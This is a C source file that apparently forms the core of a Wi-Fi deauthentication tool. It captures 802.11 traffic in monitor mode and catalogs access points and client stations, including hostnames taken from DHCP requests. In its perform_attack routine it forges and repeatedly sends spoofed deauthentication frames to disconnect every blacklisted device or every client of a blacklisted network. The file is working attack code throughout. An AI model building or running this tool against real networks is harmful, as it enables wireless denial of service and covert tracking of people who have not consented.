/*
 * Copyright (c) 2016 Emanuele Faranda <black.silver@hotmail.it>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
 */

#include "internals.h"

#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include "util.h"
#include "debug.h"

/**************************************************************************/

// Buffer used for reads; contains the radiotap header
static u_char h80211_rdbuf[BUF_LEN];

// Buffer used for writes
static u_char h80211_wrbuf_headed[BUF_LEN];
// Offset in h80211_buffer for writes; excludes the radiotap header
static u_char * h80211_wrbuf;

pcap_t * capdev = NULL;
static const u_char llcnull[4] = {0, 0, 0, 0};

// We use a fixed radiotap header for deauth
static u_char RadiotapHeader[] = {
    0x00, 0x00, // <-- radiotap version
    RADIOTAP_WR_LEN, 0x00, // <- radiotap header length (in bytes)
    0x04, 0x80, 0x00, 0x00, // <-- bitmap
    0x6c, // <-- rate (in 500kbps units) = 54 Mbps
    0x00, // <-- padding for natural alignment
    0x18, 0x00, // <-- TX flags
};

static int send_wrbuf(size_t datacount)
{
    if (pcap_sendpacket(capdev, h80211_wrbuf_headed, datacount + RADIOTAP_WR_LEN) < 0)
        return -1;
    return 0;
}

/*
 * Moves from/to attacking list based on host blacklist status.
 * Updates host blacklist flag.
 *
 */
static void update_attacking_status(const u_char * mac) {
    if (g_slist_find_custom(blacklist, mac, ssid_in_list_fn)) {
        // host is blacklisted

        // check if its an host, not an AP
        struct ssid_record * host = (struct ssid_record *) g_hash_table_lookup(hosts, mac);
        if (host) {
            // is an host
            if (! g_slist_find_custom(attacking, mac, ssid_in_list_fn))
                attacking = g_slist_insert(attacking, host, 0);
            host->blacklisted = 1;
        } else {
            struct bssid_record * ap = ap_lookup(mac);
            if (ap)
                // is an AP
                ap->ssid.blacklisted = 1;
        }
    } else {
        // host isn't blacklisted

        // check if its an host, not an AP
        struct ssid_record * host = (struct ssid_record *) g_hash_table_lookup(hosts, mac);
        if (host) {
            // is an host
            GSList * atlink = g_slist_find_custom(attacking, mac, ssid_in_list_fn);
            if (atlink)
                attacking = g_slist_delete_link(attacking, atlink);
            host->blacklisted = 0;
        } else {
            struct bssid_record * ap = ap_lookup(mac);
            if (ap)
                // is an AP
                ap->ssid.blacklisted = 0;
        }
    }
}

/* Analize a packet deeply to gain more information */
static void analize_packet(const struct ieee80211_hdr * header, size_t len) {
    if (WLAN_FC_GET_TYPE(header->frame_control) == WLAN_FC_TYPE_DATA) {
        size_t skip = -1;

        // has a QOS flag on
        if (WLAN_FC_GET_STYPE(header->frame_control) == WLAN_FC_STYPE_QOS_DATA) {
            skip = 34;
        // has a QOS flag off
        } else if (WLAN_FC_GET_STYPE(header->frame_control) == WLAN_FC_STYPE_DATA) {
            skip = 32;
        }

        // not interested
        if (skip == -1)
            return;

        const size_t llclen = len - skip - 4; // 4 is 802.11 FCS trailer
        const u_char * llcbuf = (u_char *)header + skip;
        const u8 llchlen = 8;

        if (llclen < llchlen)
            return;

        const be16 netproto = be_to_host16(*(u16 *)(llcbuf+6));
        const size_t netlen = llclen - llchlen;

        // ipv4 protocol
        if (netproto ==  0x0800 && netlen >= 20) {
            const u_char * ip4buf = llcbuf + llchlen;
            const u8 ip4hlen = (ip4buf[0] & 0x0F) * 4;
            const size_t ip4len = netlen - ip4hlen;
            //~ const be16 ip4len = be_to_host16(*(u16 *)(ip4buf+2)) - ip4hlen;

            if (ip4buf[9] == 0x11 && ip4len >= 8) {
                // Udp packet
                const u_char * udpbuf = ip4buf + ip4hlen;
                const size_t udplen = ip4len - 8;
                //~ const be16 udplen = be_to_host16(*(u16 *)(udpbuf + 4));

                const be16 srcport = be_to_host16(*(u16 *)(udpbuf + 0));
                const be16 dstport = be_to_host16(*(u16 *)(udpbuf + 2));

                // bootp client -> bootp server
                if (srcport == 68 && dstport == 67) {
                    const u_char * bootbuf = udpbuf + 8;

                    // OpCode == Boot Request
                    if (bootbuf[0] == 0x01 && udplen > 236) {
                        const u_char * vendorbuf = bootbuf + 236;
                        const size_t vendorlen = udplen - 236;

                        if (vendorlen < 64)
                            return;

                        const be32 vendcode = be_to_host32(*(u32 *)(vendorbuf + 0));
                        // vendor == DHCP magic cookie - rfc1533
                        if (vendcode == 0x63825363) {
                            // read the options
                            size_t i = 4;
                            while (i < vendorlen) {
                                const u8 bootopt = vendorbuf[i];

                                // END option
                                if (bootopt == 255)
                                    break;

                                // PAD option
                                if (bootopt == 0) {
                                    i += 1;
                                } else {
                                    const u8 optlen = vendorbuf[i+1];

                                    // Hostname Option
                                    if (bootopt == 12) {
                                        struct ssid_record * host = g_hash_table_lookup(hosts, header->addr3);
                                        if (host) {
                                            const size_t copysize = min(optlen, HOST_NAME_MAX_SIZE-1);
                                            memcpy(host->hostname_s, vendorbuf+i+2, copysize);
                                            host->hostname_s[copysize] = '\0';
                                        }
                                        break;
                                    }

                                    i += optlen + 2;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

/**************************************************************************/

GSList * blacklist = NULL;
GSList * attacking = NULL;
const u_char NULL_MAC[6] = {0};

int init_internals(const char * ifname) {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};

    capdev = pcap_open_live(ifname, SNAPLEN, 1, READ_TIMEOUT, errbuf);
    if (capdev == NULL) {
        fprintf(stderr, "Cannot open monitor interface: %s\n", errbuf);
        return -1;
    } else if (errbuf[0] != 0) {
        fprintf(stderr, "pcap_open_live() warning: %s\n", errbuf);
    }

    /* drop privileges */
    if (setuid(getuid()) == -1)
		perror("setuid");

    // Init buffers
    memcpy(h80211_wrbuf_headed, RadiotapHeader, RADIOTAP_WR_LEN);
    h80211_wrbuf = h80211_wrbuf_headed + RADIOTAP_WR_LEN;

    if (init_model() < 0)
        return -1;

    return 0;
}

int destroy_internals() {
    destroy_model();
    g_slist_free_full(blacklist, free_fn);
    g_slist_free(attacking);

    pcap_close(capdev);
    return 0;
}

/* Reads a packet from the capture capdevice into h80211_rdbuf.
 *  Returns -1 if read failed;
 *  Returns 0 on success;
 *
 */
int read_packet(const u_char ** dataptr, size_t * len) {
    //fprintf(stderr, "READing %u bytes\n", count);
    struct pcap_pkthdr * h;
    const u_char * data;

    switch(pcap_next_ex(capdev, &h, &data)) {
        case 1:
            /* ok */
            break;
        case 0:
            //~ fprintf(stderr, "Timeout\n");
            return -1;
        case -1:
            pcap_perror(capdev, "Error while reading the packet");
            return -1;
        case -2:
            fprintf(stderr, "Savefile end\n");
            return -1;
        default:
            fprintf(stderr, "Unknown error\n");
            return -1;
    }

    if (h->caplen < 0x0c || ((u_int16_t)data[0] != 0x0000)) {
        //~ fprintf(stderr, "Radiotap header not found or unknown version\n");
        return -1;
    }

    if (h->caplen > BUF_LEN) {
        fprintf(stderr, "Insufficient buffer size!\n");
        return -1;
    }

    memcpy(h80211_rdbuf, data, h->caplen);

    *dataptr = h80211_rdbuf;
    *len = h->caplen;
    return 0;
}

/* Sends DEAUTH_DIRECTED packets, to the station then to the host, foreach attacking host */
void perform_attack() {
    struct ieee80211_mgmt * dehdr = (struct ieee80211_mgmt*) h80211_wrbuf;
    dehdr->frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_DEAUTH);
    dehdr->duration = 0x013a;
    dehdr->seq_ctrl = 0x0;
    dehdr->u.disassoc.reason_code = WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA;
    (*dehdr->u.disassoc.variable) = 0x0;

    time_t now = time(0);
    GSList * current = attacking;
    GSList * prev = NULL;

    while(current && (now - ((struct ssid_record *)current->data)->ldeauth) >= DEAUTH_INTERVAL) {
        //~ printf("Phase I: AP -> station\n");
        struct ssid_record * target = (struct ssid_record *) current->data;
        u_char * mac = target->ssid;

        if (memcmp(target->assoc, NULL_MAC, 6) != 0) {
            memcpy(dehdr->bssid, target->assoc, 6);
            memcpy(dehdr->sa, target->assoc, 6);
            memcpy(dehdr->da, target->ssid, 6);

            printf("Sending %d directed DeAuth. STMAC:"
              " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
              DEAUTH_DIRECTED, mac[0],  mac[1],
              mac[2],  mac[3], mac[4],  mac[5]);

            for(int i = 0; i < DEAUTH_DIRECTED; i++)
                send_wrbuf(26);
        }

        prev = current;
        current = current->next;
    }

    for (GSList * st = attacking; st != current; st = st->next) {
        //~ printf("Phase II: station -> AP\n");
        struct ssid_record * target = (struct ssid_record *) st->data;

        if (memcmp(target->assoc, NULL_MAC, 6) != 0) {
            memcpy(dehdr->bssid, target->assoc, 6);
            memcpy(dehdr->sa, target->ssid, 6);
            memcpy(dehdr->da, target->assoc, 6);

            for(int i = 0; i < DEAUTH_DIRECTED; i++)
                send_wrbuf(26);

            target->ldeauth = now;
        }
    }

    if (current && prev) {
        // from head to bottom in the queue
        g_slist_last(attacking)->next = attacking;
        prev->next = NULL;
        attacking = current;
    }
}

/* Receives a radiotap header as 'data' */
void pckdata_handler(const u_char * radiodata, size_t radiolen) {
    const size_t hlen = le_to_host16(*(u16 *)(radiodata + 2));
    const size_t len = radiolen - hlen;
    const u_char * data = radiodata + hlen;

    //~ printf("Got packet: %u bytes\n", len);

    const u_char * bssid;
    const u_char * station;

    // filter bad packets (from airodump-ng.c source):
    //      skip packets smaller than a 802.11 header
    if(len < 24)
        return;
    // skip (uninteresting) control frames -> Removes a TON of frames!
    if((data[0] & 0x0C) == 0x04)
        return;
    // if it's a LLC null packet, just forget it
    if (len > 28 && memcmp(data + 24, llcnull, 4) == 0)
        return;
    // END filter bad packets

    struct ieee80211_hdr * header = (struct ieee80211_hdr *) data;
    enum pck_direction_e direction;

    get_bssid_and_station(header, &bssid, &station, &direction);
    const u_short isdata = WLAN_FC_GET_TYPE(header->frame_control) == WLAN_FC_TYPE_DATA;
    time_t now = time(0);

    if (bssid) {
        struct bssid_record *  bssrec = ap_lookup(bssid);
        if (! bssrec) {
            bssrec = ap_create(bssid);
            bssrec->ssid.fseen = now;
            if (! bssrec)
                fprintf(stderr, "ap_create() error: cannot allocate new host\n");

            printf("New bssid: %s\n", bssrec->ssid.ssid_s);

            update_attacking_status(bssrec->ssid.ssid);
        }

        // is a beacon frame?
        if (data[0] == 0x80 && bssrec->essid[0] == 0) {
            struct ieee802_11_elems elems;
            struct ieee80211_mgmt * frame = (struct ieee80211_mgmt *)header;
            const size_t elen = len - (frame->u.beacon.variable - data);

            ieee802_11_parse_elems(frame->u.beacon.variable, elen, &elems, 0);
            if (elems.ssid_len > 0) {
                const size_t count = elems.ssid_len < (SSID_MAX_SIZE-1) ? elems.ssid_len : (SSID_MAX_SIZE-1);
                strncpy(bssrec->essid, (char *)elems.ssid, count);
                bssrec->essid[count] = '\0';
            }
            if (elems.ds_params_len >= 1) {
                bssrec->channel = elems.ds_params[0];
            }
        }

        // radiotap: requires that all fields in the radiotap header are aligned to natural boundaries
        uint32_t it_present = le_to_host32(*(u32*)(radiodata + 4));
        //~ uint8_t ch = 0;
        int8_t signal = 0;

        size_t nextbyte;

        if(it_present & 0x80000000)         // Extended bitmap (4 bytes)
            nextbyte = 12;
        else
            nextbyte = 8;

        if (it_present & 0x1)               // TSFT (8 bytes)
            nextbyte += nextbyte % 8 + 8;

        nextbyte += ((it_present & 0x2) && 1);   // FLAGS 1 byte
        nextbyte += ((it_present & 0x4) && 1);   // RATE: 1 byte

        if (it_present & 0x8) {             // Channel + Channel type (2 + 2 bytes)
            // NB: this is the network card frequency! AP can still be in another channel
            //~ const le16 freq = le_to_host16(*(u16 *)(radiodata + nextbyte + nextbyte % 2));
            //~ ch = get_channel(freq);
            nextbyte += nextbyte % 2 + 4;
        }

        if (it_present & 0x10)              // FHSS (2 bytes)
            nextbyte += nextbyte % 2 + 2;

        if (it_present & 0x20)
            signal = *(radiodata + nextbyte);
        // END radiotap

        //~ if (ch)
            //~ bssrec->channel = ch;
        if (signal)
            bssrec->signal = signal;

        // Update counters
        if (direction == PCKDIR_AP_TO_STATION) {
            bssrec->ssid.lseen = now;

            if (isdata)
                bssrec->ssid.datasent += 1;
        } else if (direction == PCKDIR_STATION_TO_AP) {
            if (isdata)
                bssrec->ssid.datarecv += 1;
        }
    }

    if (station) {
        struct ssid_record * host = g_hash_table_lookup(hosts, station);

        if(! host) {
            host = host_create(station);
            if (! host)
                return;

            printf("New host: %s\n", host->ssid_s);
            // unassociated
            //ap_add_host(NULL_MAC, host);
        }

        if (bssid && memcmp(host->assoc, bssid, 6) != 0) {
            if (memcmp(host->assoc, NULL_MAC, 6) != 0)
                // host changed association
                ap_remove_host(host->assoc, host);

            memcpy(host->assoc, bssid, 6);
            ap_add_host(host->assoc, host);

            //TODO restructure ap blacklist stuff with possible host removal in mind
            if (g_slist_find_custom(blacklist, host->assoc, ssid_in_list_fn))
                host_blacklist(host->ssid);
            else
                update_attacking_status(host->ssid);
        }

        // Update counters
        if (direction == PCKDIR_AP_TO_STATION) {
            if (isdata)
                host->datarecv += 1;
        } else if (direction == PCKDIR_STATION_TO_AP) {
            host->lseen = now;

            if (isdata)
                host->datasent += 1;
        }
    }

    // ieee-801.11
    analize_packet(header, len);
}

int host_blacklist(u_char mac[6]) {
    GSList * found = g_slist_find_custom(blacklist, mac, ssid_in_list_fn);
    int rv = -1;

    if (! found) {
        u_char * ownmac = (u_char *) malloc(6);
        memcpy(ownmac, mac, 6);
        blacklist = g_slist_append(blacklist, ownmac);
        rv = 0;

        // if it's an AP, also blacklist current clients
        struct bssid_record * ap = ap_lookup(mac);
        if (ap) {
            for (GSList * link = ap->hosts; link; link = link->next) {
                struct ssid_record * host = (struct ssid_record *)link->data;
                host_blacklist(host->ssid);
            }
        }
    }

    update_attacking_status(mac);
    return rv;
}

int host_unblacklist(u_char mac[6]) {
    GSList * found = g_slist_find_custom(blacklist, mac, ssid_in_list_fn);
    int rv = -1;

    if (found) {
        free(found->data);
        blacklist = g_slist_delete_link(blacklist, found);
        rv = 0;
    }

    update_attacking_status(mac);
    return rv;
}
